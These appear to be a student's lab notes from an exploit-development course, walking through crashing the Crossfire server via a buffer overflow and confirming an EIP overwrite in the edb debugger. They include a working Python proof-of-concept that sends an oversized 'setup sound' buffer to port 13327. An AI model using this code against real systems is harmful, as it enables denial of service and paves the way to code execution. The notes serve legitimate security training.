# 12.2.1 - Replicating the Crash

## Practice - Replicating the Crash

_(To be performed on your own Kali and Debian lab client machines - Reporting is required for these exercises)_

1.  Log in to your dedicated Linux client using the credentials you received.
In order to login to our linux client we simply need to start the machine and then rdesktop with our credentials.
`rdesktop -u student -g 1024x768 -r clipboard:CLIPBOARD 192.168.233.44`

In preperation for the remaining tasks we must also launch the "Crossfire" application
![[Pasted image 20220714121053.png]]

2.  On your Kali machine, recreate the proof-of-concept code that crashes the Crossfire server.
Once the application is running we can use the following code on our Kali machine to crash the application 
```python
#!/usr/bin/python3
import socket

ip = "192.168.233.44"
port = 13327

crash = "\x41" * 4379
buffer = "\x11(setup sound " + crash + "\x90\x00#"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```




3.  Attach the debugger to the Crossfire server, run the exploit against your Linux client, and confirm that the EIP register is overwritten by the malicious buffer.
We need to start edb, attach to crossfire, and put crossfire into "Run" mode.
![[Pasted image 20220714121306.png]]
Once this is complete we can execute our PoC code on our Kali machine to observe the crash.

![[Pasted image 20220714121915.png]]


# 12.3.1 Controlling EIP
#### Exercises

_(To be performed on your own Kali and Debian lab client machines - Reporting is required for these exercises)_

1.  Determine the correct buffer offset required to overwrite the return address on the stack.
2.  Update your stand-alone script to ensure your offset is correct.